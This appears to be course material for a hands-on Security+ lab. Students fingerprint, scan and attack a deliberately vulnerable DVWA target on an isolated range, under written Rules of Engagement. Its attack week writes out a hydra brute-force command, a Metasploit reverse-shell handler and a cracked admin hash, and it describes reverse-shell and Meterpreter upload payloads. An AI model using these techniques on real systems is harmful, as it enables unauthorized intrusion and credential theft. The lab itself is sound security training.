course.title: Security+ Capstone Lab
course.audience: Hands-on offensive + defensive lab — you play Red, Blue, or GRC on a live range.
course.description: Four weeks on a live range as Red, Blue or GRC: reconnaissance, hardening, a staged breach, and the report you hand to a client.

weeks.title: Lab Setup & Rules of Engagement
weeks.theme: Stand up your environment and agree the rules before any testing
weeks.objective: Get your tools running, reach your targets, and confirm authorized scope
weeks.milestone: Your Kali reaches the target, DVWA loads, and the Rules of Engagement are signed.

weeks.title: Cold Recon
weeks.theme: Build, connect, passive recon, baseline hardening
weeks.objective: Establish baseline, passive reconnaissance, and foundational security controls
weeks.milestone: You have an OSINT profile of the target, a hardened baseline, and a named control framework.

weeks.title: Hard Target
weeks.theme: Authorized vulnerability assessment + SOC detection engineering
weeks.objective: Perform vulnerability discovery and detection engineering
weeks.milestone: Every open service is listed with its version, and each risk has a likelihood and impact rating.

weeks.title: The Breach
weeks.objective: Execute authorized attacks and investigate findings
weeks.milestone: An attack succeeded, Blue caught it in the logs, and the evidence is hashed with an unbroken chain of custody.

weeks.title: Payday
weeks.objective: Compile and present final findings and recommendations
weeks.milestone: The incident is closed and the final report and briefing are ready to hand over.

tasks.title: Get Kali Ready & Confirm Scope
tasks.objective: Boot your Kali attack box, reach your company target, and confirm what you are authorized to test.
learn: Verifying network reach to a target
Reading the Rules of Engagement (authorized scope)
prerequisites: Your company target IP (from the instructor)
The DVWA web target is stood up by Blue in Week 0 (http://<UBUNTU_IP>/)
definitionOfDone: Kali boots and is fully updated
You can ping your company target
You have read and understood the authorized scope

handoff.note: Acknowledge the Rules of Engagement so GRC knows scope is understood.

steps.title: Boot & Update Kali
steps.description: Boot your Kali VM and refresh then upgrade all packages.
steps.instruction: Start the Kali VM, open a terminal, and run the update command.

commands.explain: Refresh the package list so you install the newest versions.
Install all available updates (-y auto-confirms).

steps.expectedOutput: Packages refreshed and upgraded
steps.outputExplanation: A clean prompt with no errors means your tools are current; a long "upgraded, newly installed" summary is normal the first run.
steps.whatItMeans: Your attack tools are patched and current before you begin.
steps.troubleshooting: If apt reports a lock error, another update is running — wait a minute and retry, or reboot the VM.

steps.title: Verify You Can Reach Your Target
steps.description: Ping your assigned company host to confirm it is reachable.
steps.instruction: Replace the placeholder with your target IP and run the ping.

commands.explain: Send two small test packets to your target and wait for replies. Replace <YOUR_TARGET_IP> with your target’s address (or set it in the Lab access panel and it fills in automatically).

flags.meaning: Checks whether another computer is reachable on the network.
Send only 2 packets then stop (without -c, ping runs forever — press Ctrl+C to stop).
The address to test, e.g. 10.10.10.5.

steps.expectedOutput: 2 packets transmitted, 2 received, 0% packet loss
steps.outputExplanation: Low-time replies mean reachable; "Destination host unreachable" or 100% loss is a network problem to fix before scanning.
steps.whatItMeans: You have a live network path to the box you are authorized to test.
steps.troubleshooting: No reply? Check your VM network adapter is on the lab network (as the instructor specified) and the target is powered on.

steps.title: Confirm Authorized Scope
steps.description: Confirm what you are authorized to test.
steps.instruction: Read the Rules of Engagement from GRC and confirm your authorized target(s) before any scanning.
steps.whatItMeans: You attack only your own target, within the approved window.

tasks.title: OSINT & Passive Recon
tasks.objective: Gather open-source intelligence and passively fingerprint the target to build an asset list.

handoff.note: Feed recon into the asset inventory and risk mapping.

steps.title: Verify Connectivity
steps.description: List your own IP and ping the target to confirm you share a subnet.
steps.instruction: Run the command and note your ens18 address and the ping reply.

commands.explain: List your network interfaces and IP addresses.
Send one packet to the target to confirm it answers.

steps.commandExplanation: `ip a` lists every network interface and its assigned address; `ping -c 1` sends a single ICMP echo (the `-c 1` caps it at one packet) to confirm the target answers.

commandFlags.meaning: Show all network interfaces and their IP addresses.
Send ICMP echo requests to test reachability.
Stop after 1 packet instead of pinging forever.
The host being pinged (the gateway/target).

steps.expectedOutput: ens18 inet 10.10.100.X, ping reply from target
steps.outputExplanation: The `ens18` `inet` line in the 10.10.100.X range is your IP, and a "1 received, 0% packet loss" line proves the target answers.
steps.whatItMeans: Your Kali box and the target sit on the same subnet, so scanning will work.

fixes.fix: Confirm the target VM is on and on the same lab network, and that .1 is your gateway (yours may differ — use the address from Lab access).
Your Kali NIC may be on the wrong adapter — check that `ip a` shows a 10.10.100.X address.

steps.title: WHOIS & DNS Enumeration
steps.description: Query registration and DNS records to map the target domain.
steps.instruction: Run the WHOIS and DNS lookups and note the registrar, name servers, and mail servers.

commands.explain: Query domain registration / ownership records.
Ask DNS for every record type for the domain.
Look up only mail-exchanger (mail server) records.

steps.commandExplanation: `whois` pulls registration/ownership records; `dig ANY` asks DNS for every record type at once; `nslookup -type=mx` narrows the query to just mail-exchanger records.

commandFlags.meaning: Query domain registration / ownership records.
Ask DNS for every record type for the domain.
Look up only mail-exchanger (mail server) records.

steps.expectedOutput: Domain info, A/MX/NS records
steps.outputExplanation: The `whois` block shows the registrar and contacts; `dig` lists A, NS and MX records, with the MX names revealing where the target receives email.
steps.whatItMeans: You now know the target owner, mail servers, and DNS structure.

fixes.symptom: No records, or "connection timed out; no servers could be reached"?
fixes.fix: The lab domain may not resolve on your DNS — point dig at the lab DNS (dig @<UBUNTU_IP> ANY target.local) or use the target IP directly.
Expected for a private lab domain.

steps.title: Web Tech Discovery
steps.description: Fingerprint the target web stack and save the results to Recon_Findings.md.
steps.instruction: Run whatweb and tee its output into the canonical recon file.

commands.explain: Create the week-1 artifacts folder (no error if it exists).
Fingerprint the web stack and save the output to your recon file.

steps.commandExplanation: `whatweb` fingerprints the server, language and frameworks behind the URL, and `tee` both prints them and saves them to Recon_Findings.md.

commandFlags.meaning: Fingerprint a website’s server, language and frameworks.
The target URL to fingerprint.

steps.expectedOutput: Detected technologies printed and saved to Recon_Findings.md
steps.outputExplanation: Each `[name version]` tag is a detected technology; record exact versions (e.g. Apache 2.4.x, PHP 5.x) because old versions map to known CVEs.
steps.whatItMeans: You have a saved record of the exact software versions that may be exploitable.
steps.troubleshooting: "whatweb: command not found"? Install it: sudo apt install whatweb. No output? Use the full URL with http:// and confirm the site loads in a browser first.

steps.title: Email/Host Discovery
steps.description: Harvest emails, subdomains, and hosts for the target domain.
steps.instruction: Run theHarvester against the target domain and note candidate usernames and subdomains.

commands.explain: Gather public info (emails, subdomains, hosts) about the domain from many sources at once.

flags.meaning: An OSINT tool that collects domain intelligence.
The domain to gather information about.
Use every available data source (search engines, certs, etc.).

steps.expectedOutput: Email list, subdomains, hosts
steps.outputExplanation: Results are grouped into emails, hosts and subdomains — the email addresses become candidate usernames and the subdomains reveal extra attack surface.
steps.whatItMeans: You have candidate usernames and additional infrastructure to target.
steps.troubleshooting: "command not found"? sudo apt install theharvester. A single source erroring or rate-limiting is normal — try one source instead of all, e.g. -b bing. In an offline lab most public sources return nothing; that is expected.

steps.title: Export to Asset List
steps.description: Hand your discovered assets to GRC.
steps.instruction: List the hosts and services you found and give them to GRC — they enter them into the Asset Inventory form.
steps.whatItMeans: Your recon becomes the team asset inventory.

tasks.title: Vulnerability Discovery
tasks.objective: Perform authorized vulnerability enumeration using network and web scanning.

handoff.note: Hand findings to GRC for risk scoring.

steps.title: Network Scan - All Ports
steps.description: Scan all TCP ports with version detection.

commands.explain: Make the week-2 folder to save your scan into. -p means "create parents and don’t error if it already exists".
Scan every port on the target and save the results. Replace 10.10.100.X with your target IP (or set it once in the Lab access panel and it auto-fills).

flags.meaning: The network port-scanner tool.
Probe each open port to identify the service and its version.
Scan all 65,535 ports, not just the common ones.
Write the output to a file (> means "save to"; it overwrites).

steps.expectedOutput:
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.100.20
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (conn-refused)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.7.40

Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds

outputHighlights.label: the only state worth your time. Closed and filtered ports are not entry points; open ones are your candidate targets.
a full version string. Note it exactly — the version, not just "SSH", is what you look up for known vulnerabilities.
the DVWA web app port you attack in Week 3. Finding it here is what tells you where to point sqlmap and hydra.
you scanned exactly one host. More than one means you strayed outside the authorised target — a Rules-of-Engagement breach.

steps.whatItMeans: Discovers all listening network services and their versions.

fixes.fix: Add -Pn to skip the ping check.

fixes.symptom: No open ports, or a hang?
fixes.fix: Confirm the target is up (ping it) and that you used the right IP from Lab access. An all-port scan is slow — give it a minute.

steps.title: Web Vulnerability Scan
steps.description: Run automated web scanner against target.

commands.explain: Make the week-2 folder to save your report into (safe to run again).
Scan the target web server for known issues and misconfigurations, saving the report to a file.

flags.meaning: An automated web-server vulnerability scanner.
The host (URL) to scan.
Write the findings to this report file (-o = output).

steps.expectedOutput:
+ Target IP:          10.10.100.20
+ Target Port:        80
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: Server may leak inodes via ETags, header found with file /, fields: 0x2aa6 0x5c9...
+ /icons/README: Apache default file found.
+ /config/: Directory indexing found.
+ 8074 requests: 0 error(s) and 6 item(s) reported on remote host

outputHighlights.label: the same version nmap reported. Two tools agreeing is corroboration worth stating in the report, not a duplicate to drop.
the serious one. A browsable config directory can expose credentials — rank it above the header findings.
a leftover default file. Low risk alone, but it confirms the server was never hardened.
the scan completed and found six issues. A run that errors out early leaves your finding list incomplete.

steps.whatItMeans: Identifies common web misconfigurations and known web vulnerabilities.
steps.troubleshooting: "0 host(s) tested" or connection error? The web server isn't reachable — open http://<target>/ in a browser first, check the IP, and make sure DVWA/Apache is running. Use the full URL including http://.

steps.title: SSH Auth Methods
steps.description: Identify authentication methods on SSH.

commands.explain: Ask the SSH server which login methods it accepts (password vs key).

flags.meaning: The scanner (also runs helper scripts).
Run the NSE script that lists accepted SSH auth methods.
The SSH host to query — your target IP.

steps.expectedOutput:
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds

outputHighlights.label: this is the finding. Password auth being accepted is exactly what makes the SSH brute force in Week 3 possible.
the safer method. If ONLY this were listed, brute forcing would be pointless — the presence of password alongside it is the weakness.

steps.whatItMeans: Password auth enabled = brute force risk; SSH key only would be better.
steps.troubleshooting: "Host seems down"? Add -Pn. No SSH result? Confirm port 22 is open (from the earlier nmap scan) and the target is reachable. "Failed to resolve"? Use the numeric IP, not a hostname.

steps.title: Summarize Vulnerabilities for GRC
steps.description: Summarize your scan findings for the report.
steps.instruction: Write up your nmap and nikto findings in the Penetration Test Report form — it builds the report for you.
steps.whatItMeans: GRC gets a clean, ranked list to risk-score instead of raw scan dumps.

tasks.title: Authorized Attacks & Evidence
tasks.objective: Execute one well-documented exploit chain with complete evidence trail.
definitionOfDone: One full exploit chain proven with evidence

handoff.note: Submit attack evidence for chain of custody.

steps.title: SQL Injection Attack
steps.description: Dump the DVWA users table through the SQL-injection page.
steps.instruction: In a browser, log into DVWA and set Security = Low (DVWA Security page), then open the SQL Injection page once so the id parameter exists. Run sqlmap from your Kali terminal against that URL.

commands.explain: Make the week-3 folder to save your proof into (safe to run again).
Point sqlmap at the injectable id parameter on the DVWA SQLi page and dump the users table — usernames and password hashes — while saving everything to a proof file.

flags.meaning: Automates finding and exploiting SQL injection.
The exact URL to test — the injectable id parameter on the SQLi page.
The app is behind HTTP Basic auth — authenticate that way first.
The Basic-auth username:password.
Target the dvwa database.
Target the users table inside it.
Extract (dump) the rows of that table.
Show output on screen AND save a copy to the file (tee does both).

outputHighlights.label: sqlmap confirming the parameter is injectable. This line is the vulnerability itself — everything below is the consequence.
you reached the database and read a table you were never meant to. This is the exfiltration, proven.
admin’s password hash. This exact unsalted-MD5 value is "password" — worth noting in the report to show how quickly the dump becomes a working login.

steps.whatItMeans: Demonstrates data exfiltration risk from SQL injection.

files.name: DVWA on the target
files.purpose: must be up on :8080 with Security = Low, and the SQLi page opened once so the id parameter exists

steps.troubleshooting: "unable to connect" — check <YOUR_TARGET_IP> and that DVWA is up on :8080. "not injectable"? Set DVWA Security to Low and confirm --auth-type=BASIC --auth-creds=admin:password. If it asks about a redirect or CSRF token, answer Y to continue.

steps.title: Brute Force Attack
steps.description: Guess the DVWA admin password with hydra against the Brute Force lab page.
steps.instruction: Target the DVWA "Brute Force" lab page — NOT the main login.
instructionList: login.php has a per-request anti-CSRF user_token that hydra cannot submit, so a password it "finds" there will not actually log you in.
The Brute Force page has no such token on Low, so that is the one to attack.
You must be logged in first: in the browser, log into DVWA and set Security = Low.
Copy your PHPSESSID cookie (DevTools → Application → Cookies) and paste it into the command below.

commands.explain: Kali terminal: make the week-3 folder to save your proof into (safe to run again).
Install the wordlists package (ships the rockyou password list). Safe to run if already installed.
Unzip rockyou the first time only — this line does nothing if it is already unzipped.

commands.cmd: sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt <YOUR_TARGET_IP> -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<your_session_id>; security=low:F=Username and/or password incorrect" | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt
commands.explain: Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your logged-in cookie so the page answers, and keeps going until the "incorrect" failure text disappears. Replace <your_session_id> with your PHPSESSID.

flags.meaning: Tries many login guesses quickly.
The single username to try (lowercase L = one login name).
The password list to try, one per line (uppercase P = list).
The DVWA host and port.
The DVWA Brute Force page uses GET — so http-get-form, not http-post-form.
The Brute Force lab — unlike login.php it has no CSRF token on Low, so hydra can actually drive it.
Placeholders hydra swaps in for each guess.
Send your logged-in session + Low security so the page accepts the requests (H = add a header).
The failure text on this page — hydra stops when it no longer appears.

steps.expectedOutput:
Hydra v9.5 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[ATTEMPT] target 10.10.100.20 - login "admin" - pass "123456"
[ATTEMPT] target 10.10.100.20 - login "admin" - pass "12345"
[8080][http-get-form] host: 10.10.100.20   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found

outputHighlights.label: the whole point: a PLAINTEXT working password, not a hash. This is a credential you can log in with right now — weak password plus no lockout, proven.
the run succeeded. "0 valid passwords" usually means your session cookie or the F= failure string is wrong, not that the password is strong.
each guess. A flood of these with no lockout is itself the finding — a hardened server would have blocked the account after a few tries.

steps.whatItMeans: Shows weak password vulnerability and lack of account lockout.

files.name: rockyou.txt wordlist
files.purpose: the password list hydra tries — the install + unzip commands above put it in place

files.name: Your DVWA PHPSESSID cookie
files.purpose: hydra must send your logged-in session; copy it from DevTools → Application → Cookies

fixes.symptom: "Found" password will not log you in?
fixes.fix: You aimed at /login.php — its per-request user_token (CSRF) makes hydra hits false. Use /vulnerabilities/brute/ with your cookie (above).
Your PHPSESSID/security cookie is wrong or expired, or the F= text does not match — open the page, submit a bad password, and copy the exact "Username and/or password incorrect" text.
It is gzipped: sudo gunzip /usr/share/wordlists/rockyou.txt.gz.

fixes.symptom: Got a HASH from the SQL-injection dump instead of a password?
fixes.fix: Those are unsalted MD5 — crack them: save the hash to a file and run john --format=raw-md5 hash.txt (or hashcat -m 0). DVWA admin's 5f4dcc3b5aa765d61d8327deb882cf99 = "password".

steps.title: Command Injection & Reverse Shell
steps.description: Catch a shell from the target using a command-injection payload.
steps.instruction: A two-window attack. Know where each line goes.
instructionList: DVWA usually runs in a minimal Docker container with no nc and no bash — so the PHP payload (command 4) is the one that reliably works; the nc/bash payloads (5, 6) are fallbacks only if the container has them.
Kali terminal: start the listener (command 2) and leave it running.
Browser: DVWA (Security = Low) → Command Injection → "Enter an IP address" box. First run command 3 to see what the container has, then paste ONE payload (4, or fallback 5/6) and Submit.
The page hangs while the shell is open — that is normal; look at your listener.
Kali terminal: the shell lands in your listener. Run id, then save it and your notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt.

commands.explain: Kali terminal: make the week-3 folder to save your proof into (safe to run again).
① KALI VM terminal: start a listener and wait for the target to connect back. Leave this running in its own terminal.

flags.meaning: Netcat — raw TCP connections.
Listen mode (wait for a connection).
Verbose — print when someone connects.
No DNS lookups (use raw IPs).
Listen on port 4444.

commands.explain: ② In the browser, go to the DVWA Command Injection input field — run this FIRST. It prints which shells the container actually has, so you can pick a payload that will work. In a stock DVWA container usually only php prints a path.

flags.meaning: Shows the path of each tool that exists in the container (a blank line = not installed).

commands.explain: ② BROWSER field — RECOMMENDED for the DVWA container (PHP is always present): open a socket back to your Kali and run /bin/sh over it. Paste this and Submit.

flags.meaning: Run a one-line PHP script — PHP is guaranteed inside a DVWA container.
Open a TCP connection back to YOUR Kali on port 4444.
Wire an interactive /bin/sh to that socket (sh exists even when bash does not).

commands.explain: ② BROWSER field — Fallback A, only if command 3 showed nc: a named pipe wires a shell to a connection back to your Kali listener.

flags.meaning: Satisfies the intended field, then ; starts your injected command.
Create a named pipe used to shuttle data both ways.
Connect back to YOUR Kali IP on port 4444.
Feed what you type into a shell and send its output back down the pipe.

commands.explain: ② BROWSER field — Fallback B, only if command 3 showed bash: the bash built-in /dev/tcp opens the connection back to your listener.

flags.meaning: Start an interactive bash shell (needs bash — many containers only have sh).
Redirect it over a TCP connection to your Kali on port 4444.
Wire input and output together so the shell is usable.

steps.expectedOutput:
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.100.20 46122
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
dvwa-target

outputHighlights.label: the target dialed back to your listener. This line is the moment the reverse shell lands — before it, nothing has happened.
the proof of remote code execution. You are now running commands on the target as the web-server user — hard evidence, save it to the proof file.
the target’s own hostname, printed by a command you ran on it. Naming the box you landed on removes any doubt about whose shell this is.

steps.whatItMeans: Demonstrates RCE and full system compromise.

fixes.symptom: Ran a payload but no shell?
fixes.fix: 99% of the time the container lacks that tool — run command 3 (which nc bash python3 php) and use the PHP payload; DVWA containers ship PHP but usually not nc or bash.
Put YOUR Kali IP in <ATTACKER_IP> (find it with ip a) — 127.0.0.1 or the container IP will not work. The browser tab hangs while the shell is live; that is expected, watch your listener.
The container must reach your Kali — from the Docker HOST test: nc <ATTACKER_IP> 4444 or ping <ATTACKER_IP>. Make sure DVWA Security = Low (Medium/High strip the ; ).
Something already holds it — find it with jobs, stop it with kill %1.

steps.title: Metasploit Exploitation (File Upload → Meterpreter)
steps.description: Weaponise DVWA File Upload: upload a PHP payload and catch a Meterpreter session with Metasploit.
steps.instruction: A three-window attack. Know where each line goes.
instructionList: Kali msfconsole: start the handler (command 3) and leave it waiting.
Browser: in DVWA (Security = Low) → File Upload, choose shell.php and Upload; note the path DVWA prints, then open that path (command 4) to run it.
Back in msfconsole a Meterpreter session opens: run sysinfo and getuid (command 5) and save the proof.

commands.explain: Kali terminal: make the week-3 folder (safe to run again).
① KALI TERMINAL: generate a PHP Meterpreter payload that connects back to your Kali. Uses port 4445 so it does not clash with the netcat listener on 4444.

flags.meaning: Metasploit’s payload generator.
A PHP Meterpreter that dials back to you (reverse connection).
Your Kali IP — where the shell connects back to.
The port your handler listens on.
Write the raw PHP payload to shell.php (the file you upload).

commands.cmd: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4445; run"
commands.explain: ② KALI (new terminal): start the Metasploit handler that catches the session. Leave it running while you upload and trigger the shell.

flags.meaning: Launch Metasploit quietly and run these commands automatically.
The generic listener that receives payload connections.
Must match the payload you built with msfvenom.
Same IP and port as the payload (<ATTACKER_IP> : 4445).
Start waiting for the connection.

commands.explain: ③ BROWSER or Kali: after uploading shell.php on DVWA → File Upload (Security = Low), open the path DVWA printed to RUN the payload. Adjust the path if DVWA shows a different one.

flags.meaning: The uploaded payload’s URL — visiting it executes the PHP and fires the reverse connection.

commands.explain: KALI (msfconsole, inside the Meterpreter session): confirm the host and the user you are running as, then save the session output to ~/team-artifacts/week-3/Metasploit_Proof.txt.

flags.meaning: Show the target OS/host details.
Show which user the Meterpreter runs as (proves code execution).

steps.expectedOutput:
[*] Started reverse TCP handler on 10.10.100.5:4445
[*] Meterpreter session 1 opened (10.10.100.5:4445 -> 10.10.100.20:39002)

meterpreter > sysinfo
Computer     : dvwa-target
OS           : Linux dvwa-target 5.15.0 x86_64
Meterpreter  : php/linux
meterpreter > getuid
Server username: www-data

outputHighlights.label: the uploaded shell.php connected back to your handler. No session line means the payload never ran — check LHOST and the upload path.
interactive code execution as the web-server user, through Metasploit. This is what turns an unrestricted file upload into remote control.
confirms the session type matches the php/meterpreter payload you built. A mismatch here is why a session sometimes dies instantly.

steps.whatItMeans: Shows a full exploit framework can turn an unrestricted file upload into remote control.

fixes.fix: Confirm LHOST=<ATTACKER_IP> is your Kali IP and the handler LPORT (4445) equals the payload LPORT.
Make sure shell.php starts with <?php — msfvenom raw output sometimes needs it prepended.
Set DVWA Security to Low so .php is allowed.
Use the exact path DVWA printed (often ../../hackable/uploads/).
Re-run the handler, then re-open the URL.

steps.title: Screenshot Evidence
steps.description: Capture proof of successful exploitation.
steps.instruction: For each exploit, take a screenshot and save it as YYYYMMDD_TeamXX_Tool_Action.png (e.g. 20260624_Team01_sqlmap_dbdump.png) in ~/team-artifacts/week-3/ — dated, attributed, and self-describing. Then bundle them: zip ~/team-artifacts/week-3/Evidence_Photos.zip ~/team-artifacts/week-3/*.png
steps.expectedOutput: Correctly-named PNGs in your Evidence folder, zipped into Evidence_Photos.zip

ERROR_ROWS.fix: Check the Tailscale client is signed in and connected on your laptop, then run tailscale status on the host — it must list the host as online. On campus you can still reach it on its 10.10.30.T address while you sort this out.

ERROR_ROWS.meaning: The host rebooted and something did not come back, or your address changed.
ERROR_ROWS.fix: systemctl is-active tailscaled on the host must read active. The host keeps the same Tailscale address across reboots, so if the address you saved has changed, you are looking at a rebuilt host that was re-authorised as a new device.

ERROR_ROWS.symptom: Permission denied (publickey) after setting up keys
ERROR_ROWS.meaning: The key is not where the server expects it, or the account is wrong.
ERROR_ROWS.fix: Run ssh -v to see which key is offered, and confirm you are connecting as the right user. Password login is still enabled until Week 4 hardens it, so you have a way back in — use it rather than locking yourself out further.

ERROR_ROWS.meaning: The VM cannot reach the Core over the ops network — the second NIC, the VLAN tag or the bridge is wrong.
ERROR_ROWS.fix: On the host, ip -br a must show vmbr9 UP with the team’s 10.20.T.1 address. Inside the VM, the second interface needs its 10.20.T.x address and no gateway. Still nothing: the switch port is not trunking VLAN 20 — the Networking deep-dive owns that.

ERROR_ROWS.meaning: Some commands (a bare ping, a large download, a package install) run until you stop them, or they’re waiting on a slow or unreachable host.
ERROR_ROWS.fix: Press Ctrl+C to stop it. Re-check reachability (ping), and give a genuinely long job a minute

variants.otherwise: — an OS install or a big apt upgrade takes minutes, not seconds.

ERROR_ROWS.meaning: When anything fails, the error’s last line usually names the real problem.
ERROR_ROWS.fix: Match that line to the rows above. Also double-check you’re on the machine the step’s WHERE chip names — running the right command on the wrong host is the most common cause.

TERMINAL_BASICS.label: Open a terminal
TERMINAL_BASICS.body: On a Linux desktop, click the black terminal icon or press Ctrl+Alt+T. On a server you reach over SSH, the terminal is the session itself. You type commands here and press Enter to run them.

TERMINAL_BASICS.label: The prompt
TERMINAL_BASICS.body: A line ending in $ (or #) is the prompt — it means the terminal is waiting for you. You don’t type the $ itself.

TERMINAL_BASICS.label: Paste a command
TERMINAL_BASICS.body: Copy from this site, then in the terminal press Ctrl+Shift+V (plain Ctrl+V often does nothing in a terminal). Right-click → Paste also works.

TERMINAL_BASICS.label: Run one line at a time
TERMINAL_BASICS.body: When a step shows several numbered commands, run them one by one — paste one, press Enter, wait for it to finish, then the next.

TERMINAL_BASICS.label: sudo = run as admin
TERMINAL_BASICS.body: sudo runs a command with admin rights (it may ask for your password — typing shows nothing, that’s normal). On Windows/PowerShell, instead right-click PowerShell → “Run as administrator”.

TERMINAL_BASICS.label: Stop a stuck command
TERMINAL_BASICS.body: Press Ctrl+C to cancel a command that hangs or runs forever (e.g. a ping with no -c limit).

glossary.data.src_ip: The Wazuh search field holding the source address of a network (Suricata) alert — who the traffic came from.
glossary.data.srcip: The Wazuh search field holding the source address of a host alert (logins, web requests). Its network twin is data.src_ip — search both.
glossary.ossec.conf: The Wazuh agent's config file. It names the SOC to report to and any extra log files to ship.
glossary.hydra: A password-guessing tool. In this lab you run it against your own pod so the SOC has a brute-force attack to detect.
glossary.tcpdump: A command-line tool that records network traffic to a .pcap file you can open in Wireshark.
glossary.Wireshark: A traffic viewer. Open a .pcap in it and "Follow HTTP Stream" to read the exact request an attacker sent.
glossary.Kali: The attacker machine in your lab — a Linux build that ships with nmap, nikto, hydra and the rest.
glossary.Proxmox: A hypervisor — an operating system whose job is to run virtual machines. In Server+ you install it on your own server; in the CySA lab it already runs the lab.
glossary.POST: Power-On Self-Test — the hardware check a machine runs the moment you power it on, before any operating system. Beeps and blink codes are POST talking to you.
glossary.DIMM: A memory stick. Which slots they go in is dictated by the motherboard manual, and the wrong slots can stop the machine starting at all.
glossary.ECC: Error-Correcting Code memory — server RAM that detects and fixes single-bit corruption on the fly. Servers use it; desktops usually do not.
glossary.HCL: Hardware Compatibility List — the check that the software you plan to run officially supports the exact hardware you have, before you build on it.
glossary.UEFI: The modern replacement for the old BIOS firmware. Boot mode matters: an OS installed under UEFI will not boot if the firmware is later switched to legacy.
glossary.IOMMU: The chip feature (Intel VT-d / AMD-Vi) that lets a virtual machine be handed a real piece of hardware, like a NIC, as its own.
glossary.VT-x: Intel’s virtualization extensions. Present is not enough — they must be ENABLED in firmware setup, or the hypervisor cannot start a single VM.
glossary.stripe size: How large a chunk of data a RAID array writes to one disk before moving to the next. The default is right for this build.
glossary.IDS: Intrusion Detection System — software that watches traffic and raises an alert when it matches a known attack pattern. Suricata is yours.
glossary.NVD: National Vulnerability Database — the public catalogue you search to find a CVE and its score for a given software version.
glossary.pod: Your team’s pair of machines: one Ubuntu web server and one Windows PC.
glossary.escalate: Pass an alert on for deeper investigation, with the reason written down, instead of closing it yourself.
glossary.SOC: Security Operations Centre — the team (and dashboard) that watches for attacks around the clock.
glossary.SIEM: Security Information and Event Management — software that gathers logs from everywhere and raises alerts. Wazuh is your SIEM.
glossary.IOC: Indicator of Compromise — a clue an attacker leaves behind, like a bad IP address, file name, or hash.
glossary.CVE: Common Vulnerabilities and Exposures — a public ID for one specific known software flaw, e.g. CVE-2021-41773.
glossary.CVSS: A 0–10 score for how severe a vulnerability is, so you can rank what to fix first.
glossary.pcap: A 'packet capture' — a saved recording of network traffic you can open in Wireshark.
glossary.SQLi: SQL injection — tricking a website into running database commands it shouldn't, often to steal data.
glossary.WAF: Web Application Firewall — a filter in front of a website that blocks common attacks like SQL injection.
glossary.POA&M: Plan of Action & Milestones — a to-do list for fixing findings: what, who owns it, and by when.
glossary.PTES: Penetration Testing Execution Standard — the agreed steps of a pentest: recon, scan, exploit, report.
glossary.STRIDE: A checklist of threat types: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.
glossary.NIC: Network Interface Card — a machine's network connection. On these VMs it's usually named ens18.
glossary.IaC: Infrastructure as Code — describing machines in a text file a tool applies, so the build is repeatable and the file is the record. Terraform or OpenTofu is yours.
glossary.OpenTofu: The open-source fork of Terraform, kept under the Linux Foundation after HashiCorp changed Terraform’s licence in 2023. Same HCL, same providers, same state files; the command is tofu instead of terraform.
glossary.exporter: A small program on a host that publishes its metrics on an HTTP port for Prometheus to collect. node_exporter for Linux, windows_exporter for Windows.
glossary.IPAM: IP Address Management — the tool that holds every subnet and address and who has it, so the plan and reality are the same document. NetBox is yours.
glossary.FIM: File Integrity Monitoring — an agent that hashes important files and alerts when one changes, which is how a tampered config gets noticed.
glossary.cloud-init: The first-boot setup a cloud image runs: hostname, user, keys and addressing handed in from outside, so a clone comes up configured instead of blank.
glossary.DNAT: Destination NAT — the host rewriting where a packet is going. The rule that turns a request to the host’s campus address on port 80 into a request to websrv in the DMZ.
glossary.MASQUERADE: Source NAT behind the host’s own address, so a reply from the campus LAN or the internet comes back to the host and is handed to the guest that asked.
glossary.published port: A port on the host’s campus address that a DNAT rule hands to a VM behind it. Each one is a deliberate hole in the segmentation, and you should be able to say why it exists.
glossary.idempotent: Running it twice gives the same result as running it once. The property that makes a playbook safe to run every night — and why changed=0 on the second run is the proof.
glossary.drift: Reality diverging from what the code says — a change made in the console instead of the repository. terraform plan (tofu plan) detects it; the next apply may undo it.
glossary.dynamic inventory: Ansible asking the hypervisor which hosts exist instead of reading a list someone typed. The list is never out of date because there is no list.
glossary.XDR: Extended Detection and Response — one platform watching endpoints, logs and files across a whole fleet. Wazuh on the Core is the MSP’s.
glossary.verify job: The backup server re-reading a backup, chunk by chunk, to confirm it is restorable before anyone needs it.
glossary.SLO: Service Level Objective — the availability you promise a client, as a number. The SLA is the contract around it.
glossary.SCA: Security Configuration Assessment — checking a machine's settings against a hardening benchmark.
glossary.Rules of Engagement: The written agreement of what you're allowed to test, and when.
glossary.RoE: Rules of Engagement — the written agreement of what you're allowed to test, and when.
glossary.triage: Quickly sorting alerts into real vs noise and deciding what to escalate — like an ER nurse.
glossary.baseline: A record of what 'normal' looks like, so you can spot what's abnormal later.
glossary.chain of custody: A documented trail of who handled each piece of evidence and when — so it holds up as proof.
glossary.agent: A small program installed on each machine that ships its logs to the SOC.
glossary.gate: A checkpoint at the end of a week — finish its required work before the next week unlocks.
glossary.eve.json: The file where Suricata writes its network alerts.
glossary.subnet: A slice of a network sharing an address range, e.g. 10.10.100.x.
glossary.Wazuh: The free, open-source SIEM/SOC platform this lab is built on.
